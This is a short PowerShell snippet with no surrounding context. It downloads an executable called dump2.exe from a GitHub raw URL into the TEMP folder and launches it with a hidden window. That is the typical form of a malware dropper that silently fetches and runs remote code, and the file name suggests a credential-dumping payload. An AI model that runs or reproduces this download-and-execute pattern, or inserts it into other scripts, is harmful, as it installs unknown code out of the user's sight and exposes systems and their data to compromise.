$url5 = "https://github.com/cia168168/folder/raw/main/dump2.exe"
$output5 = "$env:TEMP\dump.exe"
Invoke-WebRequest -Uri $url5 -OutFile $output5
Start-Process -FilePath $output5 -WindowStyle Hidden
